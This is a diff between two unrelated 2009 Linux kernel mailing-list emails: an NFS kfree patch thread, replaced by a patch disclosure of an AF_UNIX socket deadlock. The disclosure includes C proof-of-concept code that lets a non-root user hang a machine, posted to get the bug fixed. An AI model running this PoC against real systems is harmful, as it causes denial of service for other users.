@@ -1,102 +1,118 @@
-Return-Path: <linux-kernel-owner+w=401wt.eu-S1753387AbZJSF6u@vger.kernel.org>
+Return-Path: <linux-kernel-owner+w=401wt.eu-S1754036AbZJSGXW@vger.kernel.org>
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-	id S1753387AbZJSF6u (ORCPT <rfc822;w@1wt.eu>);
-	Mon, 19 Oct 2009 01:58:50 -0400
-Received: (majordomo@vger.kernel.org) by vger.kernel.org id S1753183AbZJSF6t
+	id S1754036AbZJSGXW (ORCPT <rfc822;w@1wt.eu>);
+	Mon, 19 Oct 2009 02:23:22 -0400
+Received: (majordomo@vger.kernel.org) by vger.kernel.org id S1753359AbZJSGXV
 	(ORCPT <rfc822;linux-kernel-outgoing>);
-	Mon, 19 Oct 2009 01:58:49 -0400
-Received: from mail-pz0-f197.google.com ([209.85.222.197]:60854 "EHLO
-	mail-pz0-f197.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-	with ESMTP id S1753213AbZJSF6s convert rfc822-to-8bit (ORCPT
+	Mon, 19 Oct 2009 02:23:21 -0400
+Received: from mailx.hitachi.co.jp ([133.145.228.49]:58590 "EHLO
+	mailx.hitachi.co.jp" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
+	with ESMTP id S1753471AbZJSGXU (ORCPT
 	<rfc822;linux-kernel@vger.kernel.org>);
-	Mon, 19 Oct 2009 01:58:48 -0400
-X-Greylist: delayed 411 seconds by postgrey-1.27 at vger.kernel.org; Mon, 19 Oct 2009 01:58:48 EDT
-DomainKey-Signature: a=rsa-sha1; c=nofws;
-        d=gmail.com; s=gamma;
-        h=mime-version:in-reply-to:references:date:message-id:subject:from:to
-         :cc:content-type:content-transfer-encoding;
-        b=A/XjhvQJM5q9oYeKpC/CSgAgZtS5jXoZcPqvG44MAQHJCMIvIIAXgbb5lIFNOdBXmn
-         19zvz3BirC0MsnC9+newccrbZQXTJ3VjqydBnBtx0pu9kfHcxkiCSYT4EKUok/7TlEF9
-         yYjghAP7djyGxzqSahV0BqgPLvjkxCs6ZC3nE=
+	Mon, 19 Oct 2009 02:23:20 -0400
+X-Greylist: delayed 1216 seconds by postgrey-1.27 at vger.kernel.org; Mon, 19 Oct 2009 02:23:19 EDT
+X-AuditID: b753bd60-aae45ba000006009-74-4adc0118c78d
+Message-ID: <4ADC010C.5070809@hitachi.com>
+Date: Mon, 19 Oct 2009 15:02:52 +0900
+From: Tomoki Sekiyama <tomoki.sekiyama.qu@hitachi.com>
+User-Agent: Thunderbird 2.0.0.23 (Windows/20090812)
 MIME-Version: 1.0
-In-Reply-To: <1255921080.839.2.camel@penberg-laptop>
-References: <86802c440910171825j22556a4bofbf0bd6cd134d53c@mail.gmail.com>
-	 <84144f020910181935q4aed9f0dx7a8a149d8b8743c7@mail.gmail.com>
-	 <20091019114339.4b67d947@infradead.org>
-	 <1255921080.839.2.camel@penberg-laptop>
-Date: Sun, 18 Oct 2009 22:52:01 -0700
-Message-ID: <86802c440910182252v4648a7d1k249d091799583e37@mail.gmail.com>
-Subject: Re: nfs mount fail
-From: Yinghai Lu <yhlu.kernel@gmail.com>
-To: Pekka Enberg <penberg@cs.helsinki.fi>
-Cc: Arjan van de Ven <arjan@infradead.org>, Ingo Molnar <mingo@elte.hu>,
-       David Miller <davem@davemloft.net>,
-       Linux Kernel Mailing List <linux-kernel@vger.kernel.org>
-Content-Type: text/plain; charset=ISO-8859-1
-Content-Transfer-Encoding: 8BIT
+To: linux-kernel@vger.kernel.org, netdev@vger.kernel.org,
+       alan@lxorguk.ukuu.org.uk
+Cc: davem@davemloft.net, satoshi.oshima.fk@hitachi.com,
+       hidehiro.kawai.ez@hitachi.com, hideo.aoki.tk@hitachi.com
+Subject: [PATCH] AF_UNIX: Fix deadlock on connecting to shutdown socket
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: 7bit
+X-Brightmail-Tracker: AAAAAA==
+X-FMFTCR: RANGEC
 Sender: linux-kernel-owner@vger.kernel.org
 List-ID: <linux-kernel.vger.kernel.org>
 X-Mailing-List: linux-kernel@vger.kernel.org
 
-On Sun, Oct 18, 2009 at 7:58 PM, Pekka Enberg <penberg@cs.helsinki.fi> wrote:
-> On Mon, 2009-10-19 at 11:43 +0900, Arjan van de Ven wrote:
->> On Mon, 19 Oct 2009 05:35:20 +0300
->> Pekka Enberg <penberg@cs.helsinki.fi> wrote:
->>
->> > >
->> > > [  278.734149] ------------[ cut here ]------------
->> > > [  278.739620] kernel BUG at mm/slub.c:2969!
->> >
->> > So this means that someone is passing a pointer to kfree() that did
->> > not come from kmalloc(). Which tree are you testing?
->>
->> > > [  278.770030] Pid: 2594, comm: rpciod/0 Not tainted
->> > > 2.6.32-rc5-tip-01483-ga166936-dirty #651
->>
->> some evil person decided to put the exact kernel tree/version in the
->> oops output ;-)
->
-> Oh, right. Ingo, Yinghai says Linus' tree is fine so any ideas why this
-> shows up in -tip? Also it seems we've had a similar bug before:
->
->  http://lkml.org/lkml/2009/4/2/698
->
-> Hmmh?
+Hi,
+I found a deadlock bug in UNIX domain socket, which makes able to DoS
+attack against the local machine by non-root users.
 
-yes. something miss merged again...
+How to reproduce:
+1. Make a listening AF_UNIX/SOCK_STREAM socket with an abstruct
+    namespace(*), and shutdown(2) it.
+ 2. Repeat connect(2)ing to the listening socket from the other sockets
+    until the connection backlog is full-filled.
+ 3. connect(2) takes the CPU forever. If every core is taken, the
+    system hangs.
 
-need change some lines.
+PoC code: (Run as many times as cores on SMP machines.)
 
+int main(void)
+{
+	int ret;
+	int csd;
+	int lsd;
+	struct sockaddr_un sun;
+
+	/* make an abstruct name address (*) */
+	memset(&sun, 0, sizeof(sun));
+	sun.sun_family = PF_UNIX;
+	sprintf(&sun.sun_path[1], "%d", getpid());
+
+	/* create the listening socket and shutdown */
+	lsd = socket(AF_UNIX, SOCK_STREAM, 0);
+	bind(lsd, (struct sockaddr *)&sun, sizeof(sun));
+	listen(lsd, 1);
+	shutdown(lsd, SHUT_RDWR);
+
+	/* connect loop */
+	alarm(15); /* forcely exit the loop after 15 sec */
+	for (;;) {
+		csd = socket(AF_UNIX, SOCK_STREAM, 0);
+		ret = connect(csd, (struct sockaddr *)&sun, sizeof(sun));
+		if (-1 == ret) {
+			perror("connect()");
+			break;
+		}
+		puts("Connection OK");
+	}
+	return 0;
+}
+
+(*) Make sun_path[0] = 0 to use the abstruct namespace.
+    If a file-based socket is used, the system doesn't deadlock because
+    of context switches in the file system layer.
+
+Why this happens:
+ Error checks between unix_socket_connect() and unix_wait_for_peer() are
+ inconsistent. The former calls the latter to wait until the backlog is
+ processed. Despite the latter returns without doing anything when the
+ socket is shutdown, the former doesn't check the shutdown state and
+ just retries calling the latter forever.
+
+Patch:
+ The patch below adds shutdown check into unix_socket_connect(), so
+ connect(2) to the shutdown socket will return -ECONREFUSED.
+
+Signed-off-by: Tomoki Sekiyama <tomoki.sekiyama.qu@hitachi.com>
+Signed-off-by: Masanori Yoshida <masanori.yoshida.tv@hitachi.com>
 ---
- fs/nfs/super.c |    4 +++-
- 1 file changed, 3 insertions(+), 1 deletion(-)
+ net/unix/af_unix.c |    2 ++
+ 1 files changed, 2 insertions(+), 0 deletions(-)
 
-Index: linux-2.6/fs/nfs/super.c
-===================================================================
---- linux-2.6.orig/fs/nfs/super.c
-+++ linux-2.6/fs/nfs/super.c
-@@ -1231,7 +1231,6 @@ static int nfs_parse_mount_options(char
- 				goto out_nomem;
- 			token = match_token(string,
- 					    nfs_xprt_protocol_tokens, args);
--			kfree(string);
+diff --git a/net/unix/af_unix.c b/net/unix/af_unix.c
+index 51ab497..fc820cd 100644
+--- a/net/unix/af_unix.c
++++ b/net/unix/af_unix.c
+@@ -1074,6 +1074,8 @@ restart:
+ 	err = -ECONNREFUSED;
+ 	if (other->sk_state != TCP_LISTEN)
+ 		goto out_unlock;
++	if (other->sk_shutdown & RCV_SHUTDOWN)
++		goto out_unlock;
 
- 			switch (token) {
- 			case Opt_xprt_udp:
-@@ -1254,6 +1253,7 @@ static int nfs_parse_mount_options(char
- 			default:
- 				dfprintk(MOUNT, "NFS:   unrecognized "
- 						"transport protocol\n");
-+				kfree(string);
- 				return 0;
- 			}
- 			break;
-@@ -1264,6 +1264,8 @@ static int nfs_parse_mount_options(char
- 			token = match_token(string,
- 					    nfs_xprt_protocol_tokens, args);
+ 	if (unix_recvq_full(other)) {
+ 		err = -EAGAIN;
+-- 
+Tomoki Sekiyama
+Linux Technology Center
+Hitachi, Ltd., Systems Development Laboratory
+E-mail: tomoki.sekiyama.qu@hitachi.com
 
-+			kfree(string);
-+
- 			switch (token) {
- 			case Opt_xprt_udp:
- 				mnt->mount_server.protocol = XPRT_TRANSPORT_UDP;
